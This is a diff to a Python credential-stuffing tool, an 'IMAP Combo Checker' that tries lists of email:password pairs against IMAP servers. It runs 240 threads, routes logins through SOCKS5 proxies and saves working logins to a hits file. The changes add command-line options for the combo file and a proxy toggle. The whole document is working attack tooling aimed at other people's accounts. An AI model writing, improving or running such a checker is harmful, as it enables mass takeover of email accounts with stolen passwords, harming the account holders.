@@ -6,9 +6,9 @@ import os
 import configparser
 import socks
 import socket
+import argparse
 
 # Configuration
-COMBO_FILE = "combo.txt"  # Email:Password wordlist combo to check.
 IMAP_SUBDOMAINS_FILE = "imapsubdomains.txt"  # Possible IMAP addresses. The most common have been added for a great speed:discovery ratio.
 VALID_HITS_FILE = "imap_valid_hits.txt"  # Valid results will be here. As of now there is no capture features, I plan to add in the future.
 CONFIG_FILE = "imap_config.ini"  # This file auto-updates the more you run the script, and becomes faster as it gains more known servers.
@@ -16,7 +16,13 @@ TIMEOUT = 3  # seconds
 MAX_THREADS = 240  # Adjust as needed
 VERBOSE = "-v" in sys.argv  # Check if verbose mode is enabled
 CONFIG_LOAD_INTERVAL = 30  # Reload config.ini every 30 lines.
-PROXY_LIST_PATH = "imap_socks5.txt"  # Path to proxy list file
+PROXY_LIST_PATH = "imap_socks5.txt"  # Path to the proxy list file (hardcoded)
+
+# Argument parser
+parser = argparse.ArgumentParser(description='IMAP Combo Checker')
+parser.add_argument('-c', '--combo', type=str, default='combo.txt', help='Path to the combo file')
+parser.add_argument('-p', '--proxy', action='store_true', help='Toggle the use of proxies')
+args = parser.parse_args()
 
 # Load proxies
 def load_proxies():
@@ -85,7 +91,7 @@ def check_email(email, password, config, line_number, total_lines):
     for imap_server in imap_servers:
         mail = None
         try:
-            if PROXIES:
+            if args.proxy:
                 set_socks_proxy()
             mail = imaplib.IMAP4_SSL(imap_server, timeout=TIMEOUT)
             mail.login(email, password)
@@ -122,9 +128,9 @@ def main():
     threads = []
     config = load_config()  # Initial config load
     lines_processed = 0
-    total_lines = sum(1 for _ in open(COMBO_FILE, "r"))
+    total_lines = sum(1 for _ in open(args.combo, "r"))
 
-    with open(COMBO_FILE, "r") as f:
+    with open(args.combo, "r") as f:
         for line_number, line in enumerate(f, 1):
             parts = line.strip().split(":")
             if len(parts) == 2:
